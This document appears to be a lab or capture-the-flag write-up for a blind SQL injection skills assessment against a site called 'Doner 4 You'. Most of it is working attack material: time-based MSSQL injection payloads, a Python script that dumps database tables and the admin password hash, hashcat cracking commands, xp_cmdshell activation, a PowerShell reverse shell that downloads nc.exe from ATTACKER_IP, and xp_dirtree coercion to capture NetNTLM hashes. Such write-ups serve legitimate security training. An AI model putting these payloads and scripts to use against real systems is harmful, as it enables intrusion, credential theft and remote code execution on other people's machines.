# 🎯 Blind SQL Injection - Skills Assessment

## Scenario

**Target**: Doner 4 You website  
**Claimed Stack**: "HTML + CSS" 🤔

**Objectives**:
1. Find and exploit blind SQLi to dump admin password
2. Crack the hash and login
3. Find second SQLi and gain RCE
4. Capture and crack NetNTLM hash

---

## Phase 1: Discovery

### Finding the Injection Point

Intercept requests and notice `TrackingId` cookie - likely stored in database.

### Testing for Time-based SQLi

**Payload**:
```sql
';IF(1=1) WAITFOR DELAY '0:0:10';--
```

**URL Encode**:
```bash
printf %s "';IF(1=1) WAITFOR DELAY '0:0:10';--" | jq -Rr @uri
```

**Result**: 10 second delay = **SQLi confirmed!**

---

## Phase 2: Database Enumeration

### Oracle Script

```python
import requests, time, sys
from urllib.parse import quote

DELAY = 3

def oracle(q):
    start = time.time()
    payload = quote(f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}';--")
    r = requests.get(
        "http://<TARGET>/index.php",
        cookies={"TrackingId": payload}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range(0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string
```

### Step 1: Database Name

```python
databaseNameLength = dumpNumber("LEN(DB_NAME())")  # → 3
databaseName = dumpString("DB_NAME()", databaseNameLength)  # → d4y
```

### Step 2: Table Count

```python
databaseName = "d4y"
numberOfTables = dumpNumber(
    f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{databaseName}';"
)  # → 15
```

### Step 3: Table Names

```python
for i in range(numberOfTables):
    tableNameLength = dumpNumber(
        f"SELECT LEN(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES "
        f"WHERE TABLE_CATALOG='{databaseName}' "
        f"ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
    )
    tableName = dumpString(
        f"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
        f"WHERE TABLE_CATALOG='{databaseName}' "
        f"ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY",
        tableNameLength
    )
    print(tableName)
```

**Results**: `captcha`, `tracking`, `users` (+ system tables)

### Step 4: Column Names (users table)

```python
tableName = "users"
numberOfColumns = dumpNumber(
    f"SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS "
    f"WHERE TABLE_NAME='users' AND TABLE_CATALOG='{databaseName}'"
)  # → 3

# Columns: email, password, role
```

### Step 5: Row Count

```python
numberOfRows = dumpNumber("SELECT COUNT(*) FROM users")  # → 1
```

### Step 6: Extract Admin Credentials

```python
# Password hash
row1Length = dumpNumber("SELECT TOP 1 LEN(password) FROM users")
passwordHash = dumpString("SELECT TOP 1 password FROM users", row1Length)

# Email
emailLength = dumpNumber("SELECT TOP 1 LEN(email) FROM users")
email = dumpString("SELECT TOP 1 email FROM users", emailLength)
# → admin@d4y.at
```

---

## Phase 3: Crack Password Hash

```bash
hashcat -m 0 -w 3 -O '<HASH>' /usr/share/wordlists/rockyou.txt
```

**Credentials obtained**: `admin@d4y.at:<PASSWORD>`

---

## Phase 4: Second SQLi → RCE

### Login as Admin

Use cracked credentials to login.

### Find Second Injection

Navigate to "Create Post" - fuzz all fields.

**Vulnerable field**: `captchaAnswer`

### Test Time-based SQLi

```sql
';IF(1=1) WAITFOR DELAY '0:0:10';--
```

10 second delay = **SQLi confirmed!**

### Enable xp_cmdshell

**Step 1**: Enable Advanced Options
```sql
5';EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;--
```

```bash
curl http://<TARGET>/new.php \
  -H 'Cookie: PHPSESSID=<SESSION>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=<URL_ENCODED_PAYLOAD>"
```

**Step 2**: Enable xp_cmdshell
```sql
5';EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;--
```

### Get Reverse Shell

**PowerShell Payload**:
```powershell
(new-object net.webclient).downloadfile("http://<ATTACKER_IP>:9001/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv <ATTACKER_IP> 9002 -e c:\windows\system32\cmd.exe;
```

**Encode**:
```bash
python3 -c 'import base64; print(base64.b64encode((r"""<PAYLOAD>""").encode("utf-16-le")).decode())'
```

**Final SQLi Payload**:
```sql
5';EXEC xp_cmdshell 'powershell.exe -exec bypass -enc <BASE64>';--
```

### Setup & Execute

```bash
# Terminal 1: HTTP server for nc.exe
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
python3 -m http.server 9001

# Terminal 2: Listener
nc -nvlp 9002

# Terminal 3: Send payload
curl http://<TARGET>/new.php \
  -H 'Cookie: PHPSESSID=<SESSION>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=<URL_ENCODED_PAYLOAD>"
```

### Read Flag

```cmd
type C:\flag.txt
```

---

## Phase 5: Capture NetNTLM Hash

### Start Responder

```bash
sudo responder -I tun0
```

### Trigger SMB Authentication

```sql
';EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;--
```

**URL Encode**:
```bash
printf %s "';EXEC master..xp_dirtree '\\\\<ATTACKER_IP>\\myshare', 1, 1;--" | jq -rR @uri
```

### Send via SQLi

```bash
curl http://<TARGET>/new.php \
  -H 'Cookie: PHPSESSID=<SESSION>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=<URL_ENCODED_PAYLOAD>"
```

### Capture Hash

```
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : SQL02\Murat
[SMB] NTLMv2-SSP Hash     : Murat::SQL02:...<SNIP>...
```

### Crack Hash

```bash
hashcat -m 5600 -w 3 -O '<HASH>' /usr/share/wordlists/rockyou.txt
```

---

## Attack Chain Summary

```
1. TrackingId Cookie → Time-based SQLi
         ↓
2. Enumerate: DB → Tables → Columns → Data
         ↓
3. Extract admin password hash
         ↓
4. Crack hash with hashcat (mode 0)
         ↓
5. Login as admin
         ↓
6. captchaAnswer field → Time-based SQLi
         ↓
7. Enable xp_cmdshell
         ↓
8. PowerShell reverse shell → RCE
         ↓
9. Read flag from C:\flag.txt
         ↓
10. xp_dirtree → Capture NetNTLM hash
         ↓
11. Crack hash with hashcat (mode 5600)
```

---

## Techniques Used

| Technique | Phase |
|-----------|-------|
| Time-based Blind SQLi | Discovery |
| SQL-Anding extraction | Enumeration |
| Hash cracking (MD5) | Credential access |
| xp_cmdshell RCE | Exploitation |
| PowerShell encoded payload | Evasion |
| xp_dirtree SMB coercion | Hash capture |
| NetNTLMv2 cracking | Credential access |

---

## Key Learnings

1. **Check all input vectors** - Cookies, headers, form fields
2. **Time-based SQLi** - Useful when no visible output
3. **SQL-Anding** - Efficient extraction (7 requests/char)
4. **Chain vulnerabilities** - SQLi → RCE → Hash capture
5. **Multiple injection points** - Same app can have several

